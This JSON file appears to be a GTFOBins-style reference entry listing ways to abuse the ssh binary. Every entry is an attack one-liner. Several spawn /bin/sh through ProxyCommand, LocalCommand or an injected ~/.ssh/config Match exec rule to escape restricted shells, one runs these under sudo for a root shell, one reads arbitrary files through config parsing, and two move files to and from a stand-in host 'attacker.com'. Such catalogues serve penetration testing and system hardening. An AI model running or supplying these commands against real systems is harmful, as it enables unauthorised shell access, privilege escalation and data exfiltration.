{
  "functions": {
    "shell": [
      {
        "code": "ssh localhost /bin/sh",
        "comment": "Reconnecting may help bypass restricted shells.",
        "contexts": {
          "sudo": null,
          "suid": null,
          "unprivileged": null
        }
      },
      {
        "code": "ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x",
        "contexts": {
          "sudo": null,
          "unprivileged": null
        }
      },
      {
        "code": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost",
        "comment": "Executes a shell on the client after successful connection.",
        "contexts": {
          "sudo": null,
          "unprivileged": null
        }
      },
      {
        "code": "echo 'Match exec \"/bin/sh 0<&2 1>&2\"' > \"$HOME/.ssh/config\"; ssh -F ~/.ssh/config localhost",
        "comment": "Spawns a shell via SSH config override.",
        "contexts": {
          "sudo": null,
          "unprivileged": null
        }
      }
    ],

    "upload": [
      {
        "code": "ssh user@attacker.com 'cat > /path/to/output-file' < /path/to/input-file",
        "contexts": {
          "sudo": null,
          "suid": null,
          "unprivileged": null
        },
        "receiver": "ssh-server"
      }
    ],

    "download": [
      {
        "code": "ssh user@attacker.com 'cat /path/to/input-file' > /path/to/output-file",
        "contexts": {
          "sudo": null,
          "suid": null,
          "unprivileged": null
        },
        "sender": "ssh-server"
      }
    ],

    "file-read": [
      {
        "code": "ssh -F /path/to/input-file localhost",
        "comment": "Reads file via config parsing (output may be corrupted by errors).",
        "contexts": {
          "sudo": null,
          "suid": null,
          "unprivileged": null
        }
      }
    ],

    "sudo": [
      {
        "code": "sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x"
      }
    ]
  }
}